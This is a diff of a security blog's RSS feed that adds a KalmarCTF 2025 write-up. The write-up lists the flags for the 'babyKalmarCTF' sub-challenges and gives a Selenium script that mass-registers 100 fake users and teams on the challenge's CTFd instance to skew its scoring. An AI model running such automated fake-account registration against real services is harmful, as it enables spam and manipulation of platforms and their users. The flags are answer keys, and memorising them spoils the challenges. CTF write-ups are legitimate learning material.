@@ -1,4 +1,114 @@
-<?xml version="1.0" encoding="UTF-8"?><?xml-stylesheet href="/scripts/pretty-feed-v3.xsl" type="text/xsl"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:h="http://www.w3.org/TR/html4/"><channel><title>gr1d-init</title><description>No logs, no traces</description><link>https://gr1d-init.github.io</link><item><title>picoCTF 2025</title><link>https://gr1d-init.github.io/blog/picoctf2025</link><guid isPermaLink="true">https://gr1d-init.github.io/blog/picoctf2025</guid><description>Writeups for picoCTF 2025</description><pubDate>Tue, 11 Mar 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;[Reverse Engineering]&lt;/h2&gt;
+<?xml version="1.0" encoding="UTF-8"?><?xml-stylesheet href="/scripts/pretty-feed-v3.xsl" type="text/xsl"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:h="http://www.w3.org/TR/html4/"><channel><title>gr1d-init</title><description>No logs, no traces</description><link>https://gr1d-init.github.io</link><item><title>KalmarCTF 2025</title><link>https://gr1d-init.github.io/blog/kalmarctf2025</link><guid isPermaLink="true">https://gr1d-init.github.io/blog/kalmarctf2025</guid><description>Writeups for kalmarCTF 2025</description><pubDate>Tue, 11 Mar 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Misc&lt;/h2&gt;
+&lt;h2&gt;babyKalmarCTF&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;Question: Ever played a CTF inside a CTF?
+
+We were looking for a new scoring algorithm which would both reward top teams for solving super hard challenges, but also ensure that the easiest challenges wouldn&apos;t go to minimum straight away if more people played than we expected.
+
+Thats when we came across this ingenious suggestion! sigpwny/ctfd-dynamic-challenges-mod#1
+
+We&apos;ve implemented it this scoring idea(see here: https://github.com/blatchley/ctfd-dynamic-challenges-mod ) and spun up a small test ctf to test it out.
+
+If you manage to win babykalmarCTF, we&apos;ll even give you a flag at /flag!
+
+Spin up your own personal babykalmarCTF here: https://lab1.kalmarc.tf/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;h3&gt;Goals&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;Trick the dynamic CTF scoring system.&lt;/li&gt;
+&lt;li&gt;Solve all the solvable CTF challenges.&lt;/li&gt;
+&lt;li&gt;Spam fake team registrations on the platform.&lt;/li&gt;
+&lt;li&gt;Outperform Kalmarunionen&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h3&gt;Solution:&lt;/h3&gt;
+&lt;p&gt;Credit: @OS1R1S &lt;em&gt;for babyKalmarCTF challenges&lt;/em&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Within babyKalmarCTF there are several categories of challenges:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Baby&apos;s first RSA adventure (Crypto)&lt;/li&gt;
+&lt;li&gt;My First Flagchecker (Reverse)&lt;/li&gt;
+&lt;li&gt;THE OSINT CHALLENGE (OSINT)&lt;/li&gt;
+&lt;li&gt;Baffling, Ridiculous And Intriguing Letters, Laughter Ensues! (Misc)&lt;/li&gt;
+&lt;li&gt;Welcome Flag (Welcome)&lt;/li&gt;
+&lt;li&gt;Simple  Math Challenge (Impossible)&lt;/li&gt;
+&lt;li&gt;Baby&apos;s Second RSA (Impossible)&lt;/li&gt;
+&lt;li&gt;A randcrack challenge (Impossible)&lt;/li&gt;
+&lt;li&gt;The Last Step (Impossible)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Welcome Flag:&lt;br&gt;
+&lt;strong&gt;Flag:&lt;/strong&gt; &lt;code&gt;babykalmar{welcome_to_babykalmar_CTF}&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;My First Flagchecker:&lt;br&gt;
+&lt;strong&gt;Flag:&lt;/strong&gt; &lt;code&gt;babykalmar{string_compare_rev_ayoooooooo}&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;THE OSINT CHALLENGE:&lt;br&gt;
+&lt;strong&gt;Flag:&lt;/strong&gt; &lt;code&gt;babykalmar{aarhus}&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Baffling, Ridiculous And Intriguing Letters, Laughter Ensues:&lt;br&gt;
+&lt;strong&gt;Flag:&lt;/strong&gt; &lt;code&gt;BABYKALMAR{SUPERORIGINALMORSECODECHALLENGE}&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Baby&apos;s first RSA adventure:&lt;br&gt;
+&lt;strong&gt;Flag&lt;/strong&gt;: &lt;code&gt;babykalmar{wow_you_are_an_rsa_master!!!!!}&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;Final Result&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;After solving all the challenges, we have to trick the scoring system. The script as below, to spam fake team registration, we designed an Auto Webform Filler.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from selenium import webdriver
+from selenium.webdriver.common.by import By
+import time
+
+# Set up Firefox WebDriver
+options = webdriver.FirefoxOptions()
+options.headless = False
+
+driver = webdriver.Firefox(options=options)
+
+register_url = &quot;https://45d9cb6b475c2631a4b32ccd8e0bcf6a-59591.inst1.chal-kalmarc.tf/register&quot;
+team_url = &quot;https://45d9cb6b475c2631a4b32ccd8e0bcf6a-59591.inst1.chal-kalmarc.tf/teams/new&quot;
+logout_url = &quot;https://45d9cb6b475c2631a4b32ccd8e0bcf6a-59591.inst1.chal-kalmarc.tf/logout&quot;
+
+for i in range(100): 
+    driver.get(register_url)
+    
+    username = f&quot;FakeUser{i}&quot;
+    email = f&quot;fakeuser{i}@example.com&quot;
+    password = &quot;P@ssw0rd123&quot;
+
+    driver.find_element(By.ID, &quot;name&quot;).send_keys(username)
+    driver.find_element(By.ID, &quot;email&quot;).send_keys(email)
+    driver.find_element(By.ID, &quot;password&quot;).send_keys(password)
+
+    driver.find_element(By.ID, &quot;_submit&quot;).click()
+
+    time.sleep(2)
+
+    driver.get(team_url)
+    
+    team_name = f&quot;FakeTeam{i}&quot;
+    driver.find_element(By.ID, &quot;name&quot;).send_keys(team_name)
+    driver.find_element(By.ID, &quot;password&quot;).send_keys(&quot;TeamP@ssw0rd&quot;)
+
+    driver.find_element(By.ID, &quot;_submit&quot;).click()
+
+    print(f&quot;Registered {username} &amp;#x26; Created Team {team_name}&quot;)
+
+    driver.get(logout_url)
+    time.sleep(2) 
+
+driver.quit()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/webform.Cf8SJwFB_Z1xiINy.webp&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+&lt;img src=&quot;https://gr1d-init.github.io/_astro/result.CCB27VLr_2luLlg.webp&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+&lt;strong&gt;Flag:&lt;/strong&gt; &lt;code&gt;kalmar{w0w_y0u_b34t_k4lm4r_1n_4_c7f?!?}&lt;/code&gt;&lt;/p&gt;</content:encoded><h:img src="/_astro/kalmarCTFbanner.k231OVd_.png"/><enclosure url="/_astro/kalmarCTFbanner.k231OVd_.png"/></item><item><title>picoCTF 2025</title><link>https://gr1d-init.github.io/blog/picoctf2025</link><guid isPermaLink="true">https://gr1d-init.github.io/blog/picoctf2025</guid><description>Writeups for picoCTF 2025</description><pubDate>Tue, 11 Mar 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;[Reverse Engineering]&lt;/h2&gt;
 &lt;h2&gt;Flag Hunters&lt;/h2&gt;
 &lt;h2&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/question.D4LF0PKC_ZrNLQ6.webp&quot; alt=&quot;&quot;&gt;&lt;/h2&gt;
 &lt;h3&gt;Goals&lt;/h3&gt;
